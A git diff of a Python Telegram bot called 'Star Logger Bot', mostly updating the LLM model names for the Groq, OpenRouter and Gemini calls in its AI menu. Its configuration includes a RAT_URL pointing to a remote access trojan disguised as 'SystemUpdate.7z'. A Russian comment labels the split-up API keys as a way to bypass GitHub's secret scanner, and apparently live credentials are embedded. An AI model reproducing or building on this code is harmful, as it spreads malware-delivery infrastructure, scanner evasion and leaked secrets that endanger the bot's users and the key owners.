@@ -34,10 +34,11 @@ REF_MARKUP    = 0.5
 BOT_LINK      = "https://t.me/StarsLogg_Robot?start=" 
 RAT_URL       = "https://github.com/geminialex12-hue/Ekskks/releases/download/V1.0/SystemUpdate.7z"
 
-# --- ОБХОД СКАНЕРА GITHUB (КЛЮЧИ РАЗБИТЫ НА ЧАСТИ) ---
+# --- ОБХОД СКАНЕРА GITHUB ---
 GROQ_KEY       = "gsk_" + "puMc23GoRu8Kg" + "qvag7BqWGdyb3F" + "YSL63zpSYmcxSSwSKQHRj5qm0"
 OPENROUTER_KEY = "sk-" + "or-v1-65351102" + "d6baf880d50877" + "1bf7081c13709361" + "b0dda4135f9ccd39" + "2c77cc521e"
-GOOGLE_KEY     = "AQ." + "Ab8RN6KhJs9xiYk" + "DT21RNZ86ktVdoj" + "wSgLrAUIUYmgvnhp" + "9piA"
+# ВНИМАНИЕ: Этот ключ неверный (начинается на AQ.). Замени на свой с Google AI Studio (начинается на AIzaSy)
+GOOGLE_KEY     = "AQ." + "Ab8RN6KhJs9xiYk" + "DT21RNZ86ktVdoj" + "wSgLrAUIUYmgvnhp" + "9piA" 
 
 # ---------- BOT / TELEGRAPH ----------
 bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')
@@ -453,8 +454,8 @@ def cb_ai_menu(call):
     )
     
     kb = types.InlineKeyboardMarkup(row_width=1)
-    kb.add(types.InlineKeyboardButton("⚡ Groq (Llama 3 - быстрая)", callback_data="ask_groq"))
-    kb.add(types.InlineKeyboardButton("🦙 OpenRouter (Llama 3)", callback_data="ask_openrouter"))
+    kb.add(types.InlineKeyboardButton("⚡ Groq (Llama 3.3)", callback_data="ask_groq"))
+    kb.add(types.InlineKeyboardButton("🦙 OpenRouter (Llama 3.1)", callback_data="ask_openrouter"))
     kb.add(types.InlineKeyboardButton("✨ Gemini (Google)", callback_data="ask_gemini"))
     kb.add(types.InlineKeyboardButton("❌ Назад", callback_data="home"))
     
@@ -492,7 +493,7 @@ def process_ai_request(message, model):
             res = requests.post(
                 url="https://api.groq.com/openai/v1/chat/completions",
                 headers={"Authorization": f"Bearer {GROQ_KEY}", "Content-Type": "application/json"},
-                json={"model": "llama3-70b-8192", "messages": [{"role": "user", "content": prompt}]},
+                json={"model": "llama-3.3-70b-versatile", "messages": [{"role": "user", "content": prompt}]},
                 timeout=25
             )
             if res.ok: answer = res.json()["choices"][0]["message"]["content"]
@@ -507,7 +508,7 @@ def process_ai_request(message, model):
                     "HTTP-Referer": "https://t.me/StarsLogg_Robot",
                     "X-Title": "Star Logger Bot"
                 },
-                json={"model": "meta-llama/llama-3-8b-instruct", "messages": [{"role": "user", "content": prompt}]},
+                json={"model": "meta-llama/llama-3.1-8b-instruct:free", "messages": [{"role": "user", "content": prompt}]},
                 timeout=25
             )
             if res.ok: answer = res.json()["choices"][0]["message"]["content"]
@@ -515,7 +516,7 @@ def process_ai_request(message, model):
             
         elif model == "gemini":
             res = requests.post(
-                url=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key={GOOGLE_KEY}",
+                url=f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key={GOOGLE_KEY}",
                 json={"contents": [{"parts": [{"text": prompt}]}]},
                 timeout=25
             )
